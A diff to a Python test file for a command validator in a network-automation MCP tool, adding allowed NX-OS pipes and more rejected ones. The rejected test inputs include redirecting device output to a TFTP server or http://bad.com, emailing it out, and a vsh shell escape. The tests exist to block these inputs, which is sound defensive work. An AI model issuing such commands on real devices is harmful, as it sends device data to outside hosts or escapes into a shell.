@@ -73,9 +73,21 @@ def test_validate_command_pipes_enabled_safe(mock_load: Any, mock_settings: Any)
     assert validate_command("show version | begin router") is True
     assert validate_command("show version | count") is True
 
-    # Short abbreviations
-    assert validate_command("show version | i uptime") is True
-    assert validate_command("show version | s ospf") is True
+    # NX-OS formatting pipes
+    assert validate_command("show version | json") is True
+    assert validate_command("show version | json-pretty") is True
+    assert validate_command("show version | xml") is True
+    assert validate_command("show version | human") is True
+
+    # NX-OS textual pipes
+    assert validate_command("show version | grep test") is True
+    assert validate_command("show version | egrep test") is True
+    assert validate_command("show version | head 5") is True
+    assert validate_command("show version | last 5") is True
+    assert validate_command("show version | sort") is True
+    assert validate_command("show version | uniq") is True
+    assert validate_command("show version | wc") is True
+    assert validate_command("show version | end test") is True
 
 
 @patch("netmiko_mcp.security.settings")
@@ -85,11 +97,16 @@ def test_validate_command_pipes_enabled_dangerous(mock_load: Any, mock_settings:
     mock_settings.allow_pipe = True
     mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}
 
-    # Dangerous redirects (from IOS help output)
+    # Dangerous redirects
     assert validate_command("show version | redirect tftp://1.1.1.1/test") is False
     assert validate_command("show version | append flash:test.txt") is False
     assert validate_command("show version | tee http://bad.com") is False
 
-    # Random shell escapes
-    assert validate_command("show version | sh") is False
-    assert validate_command("show version | grep test") is False
+    # Dangerous shell escapes and manipulations (NX-OS)
+    assert validate_command("show version | awk '{print $1}'") is False
+    assert validate_command("show version | sed 's/a/b/'") is False
+    assert validate_command("show version | cut -d' ' -f1") is False
+    assert validate_command("show version | tr a b") is False
+    assert validate_command("show version | vsh") is False
+    assert validate_command("show version | email test@test.com") is False
+    assert validate_command("show version | diff") is False
